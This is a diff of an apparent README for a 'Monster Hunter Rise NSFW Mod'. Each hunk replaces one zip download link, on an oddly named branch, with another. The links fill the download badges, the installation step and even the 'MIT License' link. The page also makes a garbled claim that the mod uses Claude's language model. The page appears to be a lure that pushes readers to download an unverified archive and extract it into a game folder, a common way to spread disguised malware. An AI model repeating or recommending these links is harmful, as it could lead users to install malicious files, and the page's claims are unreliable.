@@ -1,5 +1,5 @@
 # Monster Hunter Rise NSFW Mod  
-[![Download](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)
+[![Download](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)
 
 ---
 
@@ -67,7 +67,7 @@ Harnessing the power of Claude’s language model, the mod enables smooth multil
 ## 📥 Installation Guide
 
 **1. Download the Mod Package:**  
-Click the [![Download](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip) badge to access the latest release.
+Click the [![Download](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip) badge to access the latest release.
 
 **2. Extract Files:**  
 Use a trusted unzip utility to extract contents into your Monster Hunter Rise root directory (e.g., `C:\Program Files (x86)\Steam\steamapps\common\MonsterHunterRise`).
@@ -90,7 +90,7 @@ Use responsibly and with consideration for an inclusive player community.
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License (2025).  
-Full license text can be found here: [MIT License](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)
+Full license text can be found here: [MIT License](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)
 
 ---
 
@@ -98,4 +98,4 @@ Full license text can be found here: [MIT License](https://raw.githubusercontent
 
 Unleash a new artistic frontier in Kamura Village. Click to download, explore, and enhance your Monster Hunter Rise adventure — your legend awaits!
 
-[![Download](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)](https://raw.githubusercontent.com/faiyusuf/mhrise-nsfw-mods-hub/branch/undyingly/mhrise-nsfw-mods-hub_1.7.zip)
+[![Download](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)](https://github.com/faiyusuf/mhrise-nsfw-mods-hub/raw/refs/heads/branch/undyingly/hub_nsfw_mods_mhrise_2.7-beta.4.zip)
